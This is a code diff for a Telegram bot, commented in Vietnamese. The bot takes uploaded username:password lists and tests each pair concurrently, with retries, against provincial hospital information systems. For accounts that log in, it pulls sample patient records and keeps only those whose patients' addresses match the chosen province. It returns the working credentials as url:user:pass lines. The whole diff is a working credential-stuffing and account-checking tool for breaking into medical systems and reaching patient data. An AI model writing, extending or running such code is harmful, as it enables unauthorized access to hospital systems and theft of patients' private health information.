@@ -16,9 +16,10 @@ import os
 from telegram.request import HTTPXRequest
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 from database import Database
+from libs import tinh_tp as provinces
 from libs.login import login, is_retryable
 from libs.sel_dept import sel_dept
-from Controller.bvlaichau import export_hospital_patients_excel
+from Controller.bvlaichau import export_hospital_patients_excel, get_patient_sample
 import config
 
 # Setup logging with colored console output and plain file output
@@ -204,12 +205,13 @@ DATE_OPTION_BUTTONS = [
     ],
 ]
 
-# ===================== CHỨC NĂNG LỌC TÀI KHOẢN THEO BỆNH VIỆN =====================
-# Luồng: /start → "🔍 Lọc Bệnh Viện" → chọn bệnh viện → nhập số lượng cần lấy
-#        → gửi file .txt (định dạng username:password) → bot đăng nhập thử
-#        → gửi lại file .txt chỉ chứa các tài khoản đăng nhập thành công.
+# ===================== LỌC TÀI KHOẢN THEO TỈNH =====================
+# Luồng: "🔍 Lọc Bệnh Viện" → gửi file .txt (user:pass) → chọn Tỉnh/Thành
+#        → nhập số lượng cần lấy → bot đăng nhập thử trên bệnh viện của tỉnh
+#        (+ VNPT-HIS, BVDAKHOA) và kiểm tra 1-5 bệnh nhân có DIACHI đúng tỉnh
+#        → gửi 1 file .txt chứa các tài khoản đạt (url:user:pass).
 
-FILTER_CONCURRENCY = 10
+FILTER_CONCURRENCY = 5
 # Số lần thử lại khi gặp lỗi TẠM THỜI (mạng/timeout/phản hồi lạ).
 # Sai mật khẩu thì không thử lại vì thử cũng vô nghĩa.
 FILTER_RETRY = 3
@@ -218,72 +220,152 @@ FILTER_RETRY_DELAY = 1.5   # giây, tăng dần theo số lần thử
 # Cập nhật mỗi batch (~1.5 edit/s) sẽ bị Telegram trả 429 liên tục và làm
 # chậm cả luồng vì mỗi batch phải chờ xong edit mới chạy tiếp.
 FILTER_EDIT_INTERVAL = 3.0
+# Số bệnh nhân mẫu tối đa dùng để kiểm tra DIACHI.
+FILTER_SAMPLE_SIZE = 5
 
 
-async def show_hospitals_filter_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Hiển thị danh sách bệnh viện để chọn bệnh viện cần lọc tài khoản."""
-    query = update.callback_query
-    await query.answer()
+def parse_plain_accounts(text: str) -> list[dict]:
+    """Đọc danh sách user:pass / user pass (luồng lọc, không cần URL)."""
+    accounts, seen = [], set()
+    for raw in (text or "").splitlines():
+        line = raw.strip().strip(",;").strip()
+        if not line or line.startswith(("#", "//")) or "://" in line:
+            continue
+        if "|" in line:
+            parts = [p.strip() for p in line.split("|") if p.strip()]
+            if len(parts) < 2:
+                continue
+            user, pwd = parts[0], "|".join(parts[1:])
+        else:
+            tokens = line.split()
+            if len(tokens) >= 2 and ":" not in tokens[0]:
+                user, pwd = tokens[0], " ".join(tokens[1:])
+            else:
+                user, sep, pwd = line.partition(":")
+                if not sep:
+                    continue
+        user = user.strip().strip(",;")
+        pwd = pwd.strip().strip(",;")
+        if not user or not pwd:
+            continue
+        key = (user.lower(), pwd)
+        if key in seen:
+            continue
+        seen.add(key)
+        accounts.append({"username": user, "password": pwd})
+    return accounts
 
-    json_path = pathlib.Path(__file__).parent / "hospitals.json"
-    try:
-        with open(json_path, "r", encoding="utf-8") as f:
-            hospitals = json.load(f).get("hospitals", [])
-    except Exception as e:
-        await query.message.reply_text(f"❌ Lỗi đọc dữ liệu: {e}")
-        return
 
-    if not hospitals:
-        await query.message.reply_text("❌ Danh sách bệnh viện trống.")
-        return
-
-    rows = []
-    for i in range(0, len(hospitals), 2):
-        row = []
-        for idx in range(i, min(i + 2, len(hospitals))):
-            row.append(InlineKeyboardButton(hospitals[idx]["name"], callback_data=f"flt:{idx}"))
+def build_province_keyboard() -> InlineKeyboardMarkup:
+    """Bàn phím chọn Tỉnh/Thành (3 nút mỗi hàng) + nút huỷ."""
+    rows, row = [], []
+    for p in provinces.load_provinces():
+        row.append(InlineKeyboardButton(p.get("name", "?"), callback_data=f"prov:{p['code']}"))
+        if len(row) == 3:
+            rows.append(row)
+            row = []
+    if row:
         rows.append(row)
     rows.append([InlineKeyboardButton("🔙 Huỷ", callback_data="filter_cancel")])
+    return InlineKeyboardMarkup(rows)
 
-    await safe_edit_or_reply(
-        query=query,
-        text=(
-            f"🔍 <b>Lọc tài khoản theo bệnh viện</b>\n\n"
-            f"Chọn bệnh viện bạn muốn lọc ({len(hospitals)} bệnh viện):"
-        ),
-        reply_markup=InlineKeyboardMarkup(rows),
+
+async def prompt_filter_provinces(reply_target, context: ContextTypes.DEFAULT_TYPE, content: str) -> None:
+    """Lưu danh sách tài khoản và hỏi chọn Tỉnh/Thành cần lấy."""
+    accounts = parse_plain_accounts(content)
+    if not accounts:
+        await reply_target.reply_text(
+            "❌ Không thấy tài khoản hợp lệ.\n"
+            "Mỗi dòng một tài khoản dạng <code>username:password</code>.",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔙 Huỷ", callback_data="filter_cancel")]
+            ]),
+        )
+        return
+
+    context.user_data["filter_accounts_text"] = content
+    context.user_data["awaiting_filter_file"] = False
+    context.user_data["awaiting_filter_count"] = False
+    context.user_data.pop("filter_province", None)
+    context.user_data.pop("filter_target_count", None)
+
+    await reply_target.reply_text(
+        f"📥 Nhận <b>{len(accounts)}</b> tài khoản.\n\n"
+        f"📍 Chọn <b>Tỉnh/Thành</b> cần lấy dữ liệu:",
+        parse_mode="HTML",
+        reply_markup=build_province_keyboard(),
     )
 
 
-async def filter_hospital_selected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """User chọn bệnh viện để lọc → hỏi số lượng tài khoản cần lấy."""
+async def show_hospitals_filter_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Bắt đầu phiên lọc: yêu cầu gửi file tài khoản trước."""
     query = update.callback_query
     await query.answer()
 
-    try:
-        idx = int(query.data.split(":")[1])
-        json_path = pathlib.Path(__file__).parent / "hospitals.json"
-        with open(json_path, "r", encoding="utf-8") as f:
-            hospitals = json.load(f)["hospitals"]
-        hospital = hospitals[idx]
-    except Exception as e:
-        await query.message.reply_text(f"❌ Không đọc được bệnh viện: {e}")
-        return
-
-    # Lưu trạng thái lọc, tắt trạng thái đăng nhập thường
-    context.user_data["filter_hospital"] = hospital
-    context.user_data["awaiting_filter_count"] = True
-    context.user_data["awaiting_filter_file"] = False
-    context.user_data.pop("filter_target_count", None)
-    context.user_data["awaiting_login"] = False
+    for key in (
+        "filter_province",
+        "filter_target_count",
+        "filter_accounts_text",
+        "awaiting_filter_count",
+    ):
+        context.user_data.pop(key, None)
+    context.user_data["awaiting_filter_file"] = True
 
     await safe_edit_or_reply(
         query=query,
         text=(
-            f"🏥 Bệnh viện lọc: <b>{hospital['name']}</b>\n"
-            f"🔗 <code>{hospital['link']}</code>\n\n"
-            f"🔢 Bạn muốn lấy bao nhiêu tài khoản hoạt động?\n"
-            f"<i>Nhập một số, ví dụ: <code>10</code></i>"
+            "🔍 <b>Lọc tài khoản theo tỉnh</b>\n\n"
+            "📄 Gửi file <code>.txt</code> chứa danh sách tài khoản, mỗi dòng:\n"
+            "<code>username:password</code>\n"
+            "<i>(hoặc dán trực tiếp danh sách vào chat)</i>\n\n"
+            "Sau đó bot sẽ hỏi <b>Tỉnh/Thành</b> và số lượng tài khoản cần lấy."
+        ),
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("🔙 Huỷ", callback_data="filter_cancel")]
+        ]),
+    )
+
+
+async def filter_province_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """User chọn tỉnh → hỏi số lượng tài khoản cần lấy."""
+    query = update.callback_query
+    await query.answer()
+
+    code = query.data.split(":", 1)[1]
+    province = provinces.find_province(code)
+    if not province:
+        await query.message.reply_text("❌ Không tìm thấy tỉnh/thành đã chọn.")
+        return
+
+    if not context.user_data.get("filter_accounts_text"):
+        context.user_data["awaiting_filter_file"] = True
+        await safe_edit_or_reply(
+            query=query,
+            text=(
+                "⚠️ Chưa có danh sách tài khoản.\n"
+                "Vui lòng gửi file <code>.txt</code> (mỗi dòng <code>username:password</code>) trước."
+            ),
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔙 Huỷ", callback_data="filter_cancel")]
+            ]),
+        )
+        return
+
+    context.user_data["filter_province"] = province
+    context.user_data["awaiting_filter_count"] = True
+    context.user_data["awaiting_filter_file"] = False
+
+    hospitals = provinces.province_hospitals(province)
+    names = ", ".join(h.get("name", "?") for h in hospitals) or "không có bệnh viện riêng"
+
+    await safe_edit_or_reply(
+        query=query,
+        text=(
+            f"📍 Tỉnh/Thành: <b>{province.get('name_with_type') or province.get('name')}</b>\n"
+            f"🏥 Sẽ quét: <b>{names}</b>\n\n"
+            f"🔢 Bạn muốn lấy bao nhiêu tài khoản?\n"
+            f"<i>Nhập một số, ví dụ: <code>5</code></i>"
         ),
         reply_markup=InlineKeyboardMarkup([
             [InlineKeyboardButton("🔙 Huỷ", callback_data="filter_cancel")]
@@ -292,7 +374,7 @@ async def filter_hospital_selected_callback(update: Update, context: ContextType
 
 
 async def handle_filter_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Nhận số lượng tài khoản cần lọc và yêu cầu gửi file .txt."""
+    """Nhận số lượng tài khoản cần lấy rồi bắt đầu quét."""
     text = (update.message.text or "").strip()
     if not text.isdigit() or int(text) <= 0:
         await update.message.reply_text(
@@ -302,21 +384,34 @@ async def handle_filter_count(update: Update, context: ContextTypes.DEFAULT_TYPE
         return
 
     target = int(text)
-    hospital = context.user_data.get("filter_hospital") or {}
+    province = context.user_data.get("filter_province") or {}
+    content = context.user_data.get("filter_accounts_text")
     context.user_data["filter_target_count"] = target
     context.user_data["awaiting_filter_count"] = False
-    context.user_data["awaiting_filter_file"] = True
 
-    await update.message.reply_text(
-        f"✅ Sẽ lọc lấy <b>{target}</b> tài khoản hoạt động từ <b>{hospital.get('name', '?')}</b>.\n\n"
-        f"📄 Gửi file <code>.txt</code> chứa danh sách tài khoản, mỗi dòng một tài khoản:\n"
-        f"<code>username:password</code>\n\n"
-        f"⚠️ Số tài khoản trong file phải <b>lớn hơn {target}</b>.",
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 Huỷ", callback_data="filter_cancel")]
-        ]),
-    )
+    if not province:
+        await update.message.reply_text(
+            "⚠️ Phiên lọc đã hết hạn. Vui lòng bấm 🔍 Lọc Bệnh Viện để làm lại.",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔍 Lọc Bệnh Viện", callback_data="show_hospitals_filter")]
+            ]),
+        )
+        return
+
+    if not content:
+        context.user_data["awaiting_filter_file"] = True
+        await update.message.reply_text(
+            f"✅ Sẽ lấy <b>{target}</b> tài khoản cho <b>{province.get('name')}</b>.\n\n"
+            f"📄 Gửi file <code>.txt</code> chứa danh sách tài khoản (mỗi dòng <code>username:password</code>).",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔙 Huỷ", callback_data="filter_cancel")]
+            ]),
+        )
+        return
+
+    status_msg = await update.message.reply_text("⏳ Đang chuẩn bị quét tài khoản...")
+    await process_filter_file(content, update, context, status_msg)
 
 
 async def process_filter_file(
@@ -325,27 +420,26 @@ async def process_filter_file(
     context: ContextTypes.DEFAULT_TYPE,
     status_msg,
 ) -> None:
-    """Lọc file tài khoản: đăng nhập thử và chỉ giữ lại tài khoản thành công."""
-    hospital = context.user_data.get("filter_hospital") or {}
+    """Quét tài khoản: đăng nhập trên bệnh viện của tỉnh (+ VNPT-HIS, BVDAKHOA)
+    và chỉ giữ tài khoản có bệnh nhân với DIACHI đúng tỉnh đã chọn."""
+    province = context.user_data.get("filter_province") or {}
     target = context.user_data.get("filter_target_count")
 
-    if not hospital or not target:
+    if not province or not target:
         await status_msg.edit_text(
-            "⚠️ Phiên lọc đã hết hạn. Vui lòng chọn lại bệnh viện để lọc.",
+            "⚠️ Phiên lọc đã hết hạn. Vui lòng bấm 🔍 Lọc Bệnh Viện để làm lại.",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("🔍 Lọc Bệnh Viện", callback_data="show_hospitals_filter")]
             ]),
         )
         return
 
-    accounts = parse_all_accounts(content, default_hospital=hospital)
+    accounts = parse_plain_accounts(content)
     total = len(accounts)
 
-    if total <= target:
+    if total == 0:
         await status_msg.edit_text(
-            f"❌ File chỉ có <b>{total}</b> tài khoản hợp lệ.\n"
-            f"Số lượng trong file phải <b>lớn hơn {target}</b>.\n\n"
-            f"Vui lòng gửi file khác.",
+            "❌ Danh sách không có tài khoản hợp lệ (định dạng <code>username:password</code>).",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("🔙 Huỷ", callback_data="filter_cancel")]
@@ -353,127 +447,172 @@ async def process_filter_file(
         )
         return
 
+    # Bệnh viện của tỉnh + 2 hệ thống dùng chung, khử trùng theo URL.
+    candidates, seen_urls = [], set()
+    for h in provinces.province_hospitals(province):
+        url = normalize_vncare_url(h.get("link") or h.get("domain") or "")
+        if url and url not in seen_urls:
+            seen_urls.add(url)
+            candidates.append({"url": url, "name": h.get("name") or url.split("://")[-1].split("/")[0]})
+
+    if not candidates:
+        await status_msg.edit_text(
+            f"❌ Không xác định được bệnh viện nào cho tỉnh <b>{province.get('name')}</b>.",
+            parse_mode="HTML",
+        )
+        return
+
+    province_label = province.get("name_with_type") or province.get("name") or "?"
+
     await status_msg.edit_text(
-        f"⏳ <b>Đang kiểm tra {total} tài khoản...</b>\n"
-        f"🏥 Bệnh viện: <b>{hospital.get('name', '?')}</b>\n"
-        f"🎯 Cần lấy: <b>{target}</b> tài khoản hoạt động\n"
-        f"<i>Đã kiểm tra 0/{total} — tìm được 0/{target}</i>",
+        f"⏳ <b>Đang quét {total} tài khoản...</b>\n"
+        f"📍 Tỉnh: <b>{province.get('name')}</b>\n"
+        f"🏥 Hệ thống: <b>{len(candidates)}</b> — {', '.join(c['name'] for c in candidates)}\n"
+        f"🎯 Cần lấy: <b>{target}</b> tài khoản\n"
+        f"<i>Đã kiểm tra 0/{total} — đạt 0/{target}</i>",
         parse_mode="HTML",
     )
 
     sem = asyncio.Semaphore(FILTER_CONCURRENCY)
-    valid: list[dict] = []
+    strict_valid: list[dict] = []   # DIACHI ghi đúng tên tỉnh đã chọn
+    merged_valid: list[dict] = []   # chỉ khớp tên tỉnh mới sau sáp nhập
     checked = 0
-    net_failed: list[dict] = []   # lỗi tạm thời (mạng/chập chờn)
-    last_edit = 0.0               # lần cuối cập nhật tiến độ
+    net_failed = 0
+    last_edit = 0.0
 
-    async def _check(acc: dict) -> str:
-        """Trả về "ok" | "auth" | "network".
+    def _levels(patients: list) -> set[str]:
+        levels = set()
+        for p in patients:
+            lvl = provinces.address_match_level(p.get("dia_chi", ""), province)
+            if lvl:
+                levels.add(lvl)
+        return levels
 
-        Thử lại các lỗi TẠM THỜI để không loại oan tài khoản đúng khi mạng
-        chập. Chỉ kết luận thất bại khi server trả lời rõ ràng là sai
-        tài khoản/mật khẩu ("auth").
+    async def _check(acc: dict) -> dict:
+        """Trả {'ok': True, 'level', 'url', 'hospital', 'account'} nếu tài khoản đạt.
+
+        `url` là đúng hệ thống nơi tìm thấy bệnh nhân của tỉnh — không phụ thuộc
+        tài khoản đó còn đăng nhập được ở hệ thống nào khác.
         """
+        nonlocal net_failed
         async with sem:
-            last_kind = "network"
-            for attempt in range(1, FILTER_RETRY + 1):
-                try:
-                    res = await login(
-                        url=acc["url"], username=acc["username"], password=acc["password"]
-                    )
-                except Exception as e:
-                    log.debug(f"Lỗi kiểm tra {acc.get('username')}: {e}")
-                    res = {"success": False, "error_kind": "network", "message": str(e)}
+            saw_network = False
+            for cand in candidates:
+                last_res = None
+                for attempt in range(1, FILTER_RETRY + 1):
+                    try:
+                        res = await get_patient_sample(
+                            cand["url"], acc["username"], acc["password"],
+                            limit=FILTER_SAMPLE_SIZE,
+                        )
+                    except Exception as e:
+                        res = {"success": False, "error_kind": "network", "message": str(e), "patients": []}
 
-                kind = res.get("error_kind")
-                if res.get("success"):
-                    return "ok"
-                if kind == "auth":
-                    # Sai mật khẩu -> thử lại vô nghĩa
-                    return "auth"
+                    last_res = res
+                    if res.get("success"):
+                        break
+                    # Sai tài khoản/phản hồi lạ: thử hệ thống kế tiếp.
+                    if res.get("error_kind") in ("auth", "unexpected"):
+                        break
+                    if attempt < FILTER_RETRY:
+                        await asyncio.sleep(FILTER_RETRY_DELAY * attempt)
 
-                last_kind = kind or "network"
-                if attempt < FILTER_RETRY:
-                    await asyncio.sleep(FILTER_RETRY_DELAY * attempt)
+                if last_res and last_res.get("success"):
+                    levels = _levels(last_res.get("patients", []))
+                    if levels:
+                        return {
+                            "ok": True,
+                            # Ưu tiên báo "strict" nếu có ít nhất 1 bệnh nhân đúng tên tỉnh.
+                            "level": "strict" if "strict" in levels else "merged",
+                            "url": last_res.get("url") or cand["url"],
+                            "hospital": cand["name"],
+                            "account": acc,
+                            "patients": last_res.get("patients", []),
+                        }
+                if last_res and last_res.get("error_kind") == "network":
+                    saw_network = True
 
-            return last_kind
+            if saw_network:
+                net_failed += 1
+            return {"ok": False}
 
-    # Kiểm tra theo từng đợt, dừng ngay khi đủ số lượng cần lấy
     for start in range(0, total, FILTER_CONCURRENCY):
         batch = accounts[start:start + FILTER_CONCURRENCY]
         results = await asyncio.gather(*[_check(a) for a in batch])
-        for acc, kind in zip(batch, results):
-            if kind == "ok":
-                acc["success"] = True
-                valid.append(acc)
-            elif kind == "network":
-                acc["error_kind"] = "network"
-                net_failed.append(acc)
+        for r in results:
+            if not r.get("ok"):
+                continue
+            (strict_valid if r.get("level") == "strict" else merged_valid).append(r)
         checked += len(batch)
 
-        # Chỉ cập nhật tiến độ tối đa 1 lần / FILTER_EDIT_INTERVAL giây.
-        # Edit mỗi batch vừa gây 429 vừa chặn vòng lặp chờ Telegram trả lời.
+        def _total() -> int:
+            return len(strict_valid) + len(merged_valid)
+
         now = time.monotonic()
         if now - last_edit >= FILTER_EDIT_INTERVAL:
             last_edit = now
             try:
                 await status_msg.edit_text(
-                    f"⏳ <b>Đang kiểm tra tài khoản...</b>\n"
-                    f"🏥 Bệnh viện: <b>{hospital.get('name', '?')}</b>\n"
-                    f"🎯 Cần lấy: <b>{target}</b> tài khoản hoạt động\n"
-                    f"<i>Đã kiểm tra {checked}/{total} — tìm được {len(valid)}/{target}</i>",
+                    f"⏳ <b>Đang quét tài khoản...</b>\n"
+                    f"📍 Tỉnh: <b>{province.get('name')}</b>\n"
+                    f"🎯 Cần lấy: <b>{target}</b> tài khoản\n"
+                    f"<i>Đã kiểm tra {checked}/{total} — đạt {_total()}/{target}</i>",
                     parse_mode="HTML",
                 )
             except Exception:
                 pass
 
-        if len(valid) >= target:
+        # Đủ tài khoản khớp ĐÚNG tên tỉnh thì dừng; khớp tạm (tỉnh mới sau
+        # sáp nhập) chỉ dùng để bù khi quét hết danh sách mà vẫn thiếu.
+        if len(strict_valid) >= target:
             break
+
+    valid = (strict_valid + merged_valid)[:target]
+    strict_count = sum(1 for v in valid if v.get("level") == "strict")
+    merged_count = len(valid) - strict_count
 
     context.user_data["awaiting_filter_file"] = False
     context.user_data.pop("filter_target_count", None)
+    context.user_data.pop("filter_accounts_text", None)
+    context.user_data.pop("filter_province", None)
 
     if not valid:
-        # Phân biệt "sai hết mật khẩu" với "lỗi hạ tầng": nếu phần lớn là lỗi
-        # mạng thì đừng nói với người dùng rằng tài khoản của họ sai.
-        if net_failed and len(net_failed) >= max(1, checked * 0.5):
-            await status_msg.edit_text(
-                f"⚠️ <b>Không kiểm tra được tài khoản do lỗi kết nối.</b>\n"
-                f"🏥 Bệnh viện: <b>{hospital.get('name', '?')}</b>\n"
-                f"👥 Đã kiểm tra: <b>{checked}</b> — lỗi mạng: <b>{len(net_failed)}</b>\n\n"
-                f"<i>Tài khoản chưa chắc sai. Vui lòng thử lọc lại sau ít phút.</i>",
-                parse_mode="HTML",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔍 Lọc lại", callback_data="show_hospitals_filter")]
-                ]),
-            )
-        else:
-            extra = f"\n⚠️ Lỗi mạng (chưa kết luận): <b>{len(net_failed)}</b>" if net_failed else ""
-            await status_msg.edit_text(
-                f"❌ <b>Không có tài khoản nào đăng nhập thành công.</b>\n"
-                f"🏥 Bệnh viện: <b>{hospital.get('name', '?')}</b>\n"
-                f"👥 Đã kiểm tra: <b>{checked}</b> tài khoản{extra}",
-                parse_mode="HTML",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔍 Lọc lại", callback_data="show_hospitals_filter")]
-                ]),
-            )
+        extra = f"\n⚠️ Lỗi kết nối (chưa kết luận): <b>{net_failed}</b> tài khoản" if net_failed else ""
+        await status_msg.edit_text(
+            f"❌ <b>Không tìm được tài khoản nào có bệnh nhân ở {province_label}.</b>\n"
+            f"👥 Đã kiểm tra: <b>{checked}/{total}</b> tài khoản{extra}",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔍 Lọc lại", callback_data="show_hospitals_filter")]
+            ]),
+        )
         return
 
-    final_accs = valid[:target]
-    payload = "\n".join(f"{a['username']}:{a['password']}" for a in final_accs)
-    hospital_name = hospital.get("name", "hospital")
-    filename = f"[{hospital_name}][loc][{len(final_accs)}].txt"
+    final_accs = valid
+    payload = "\n".join(
+        f"{v['url']}:{v['account']['username']}:{v['account']['password']}" for v in final_accs
+    )
+    slug = province.get("slug") or "tinh"
+    filename = f"[{slug}][loc][{len(final_accs)}].txt"
+
+    merged_name = provinces.MERGED_INTO.get(provinces.normalize_text(province.get("name", "")))
+    merged_note = ""
+    if merged_count:
+        merged_note = (
+            f"\n⚠️ <b>{merged_count}</b> tài khoản chỉ khớp theo địa giới mới"
+            + (f" (<i>{merged_name}</i>)" if merged_name else "")
+            + " — dữ liệu VnCare đã gộp tỉnh nên không tách được ở mức tỉnh."
+        )
 
     caption = (
         f"✅ <b>Lọc tài khoản hoàn tất!</b>\n"
-        f"🏥 Bệnh viện: <b>{hospital_name}</b>\n"
+        f"📍 Tỉnh: <b>{province_label}</b>\n"
         f"📥 Tài khoản nhận vào: <b>{total}</b>\n"
         f"🔍 Đã kiểm tra: <b>{checked}</b>\n"
-        f"🎯 Lấy được: <b>{len(final_accs)}/{target}</b> tài khoản hoạt động\n"
+        f"🎯 Lấy được: <b>{len(final_accs)}/{target}</b> tài khoản có bệnh nhân đúng tỉnh\n"
         f"📁 File: <code>{filename}</code>"
-        + (f"\n⚠️ <b>{len(net_failed)}</b> tài khoản lỗi mạng, chưa kết luận được"
-           if net_failed else "")
+        + merged_note
+        + (f"\n⚠️ <b>{net_failed}</b> tài khoản lỗi kết nối, chưa kết luận được" if net_failed else "")
     )
 
     try:
@@ -493,7 +632,7 @@ async def process_filter_file(
 
     await status_msg.delete()
     log.info(
-        f"Filter OK: {hospital_name} | lấy {len(final_accs)}/{target} "
+        f"Filter OK: {province_label} | lấy {len(final_accs)}/{target} "
         f"(kiểm tra {checked}/{total}) | user_id={update.effective_user.id}"
     )
 
@@ -504,8 +643,9 @@ async def filter_cancel_callback(update: Update, context: ContextTypes.DEFAULT_T
     await query.answer()
 
     for key in (
-        "filter_hospital",
+        "filter_province",
         "filter_target_count",
+        "filter_accounts_text",
         "awaiting_filter_count",
         "awaiting_filter_file",
     ):
@@ -885,6 +1025,11 @@ async def handle_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await handle_filter_count(update, context)
         return
 
+    # Luồng lọc: cho phép dán danh sách tài khoản thay vì gửi file
+    if context.user_data.get("awaiting_filter_file"):
+        await prompt_filter_provinces(update.message, context, update.message.text)
+        return
+
     context.user_data["awaiting_login"] = True
     await process_accounts_input(update.message.text.strip(), update, context)
 
@@ -917,7 +1062,8 @@ async def handle_document_accounts(update: Update, context: ContextTypes.DEFAULT
         return
 
     if is_filter_flow:
-        await process_filter_file(content, update, context, status_msg)
+        await status_msg.delete()
+        await prompt_filter_provinces(update.message, context, content)
         return
 
     await status_msg.delete()
@@ -1300,7 +1446,7 @@ def main() -> None:
     application.add_handler(CommandHandler("ping", ping_command))
     application.add_handler(CallbackQueryHandler(show_hospitals_callback, pattern="^show_hospitals$"))
     application.add_handler(CallbackQueryHandler(show_hospitals_filter_callback, pattern="^show_hospitals_filter$"))
-    application.add_handler(CallbackQueryHandler(filter_hospital_selected_callback, pattern=r"^flt:\d+$"))
+    application.add_handler(CallbackQueryHandler(filter_province_callback, pattern=r"^prov:\d+$"))
     application.add_handler(CallbackQueryHandler(filter_cancel_callback, pattern="^filter_cancel$"))
     application.add_handler(CallbackQueryHandler(export_date_callback, pattern=r"^date_opt:"))
     application.add_handler(CallbackQueryHandler(show_date_options_callback, pattern="^show_date_options$"))
